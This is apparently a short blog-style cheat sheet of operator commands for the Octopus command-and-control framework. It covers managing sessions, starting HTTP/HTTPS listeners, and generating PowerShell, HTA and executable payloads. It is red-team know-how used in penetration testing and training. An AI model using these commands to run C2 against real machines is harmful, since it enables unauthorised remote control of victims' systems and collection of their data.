Octopus C2 Usage Notes

Created2022-09-15|Updated2022-09-15|Tools
|Post View:

Notes

list - List all connected machines

delete 1 - Delete a session

listeners - List all listeners

dalete_listener test - Remove a listener

listen_http - View explanation of command parameters

listen_http BindIP BindPort hostname interval URL listener_name - Start a http listener

listen_http 0.0.0.0 8022 seraph.xxx 5 page test1 - Start the listener with the domain

listen_http 0.0.0.0 8033 192.168.0.194 5 page2.php test2 - Start the listener with IP

listen_https 0.0.0.0 443 seraph.xxx 5 page.php test1 /root/ssl/ca.crt /root/ssl/server.pem - Start the https listener

generate_powershell test - Generate a powershell payload

generate_hta test - Generate an HTA payload

generate_exe test /root/test.exe - Generate Windows executable

interact 2 - Select Session Interaction

report - Automatic collection of information
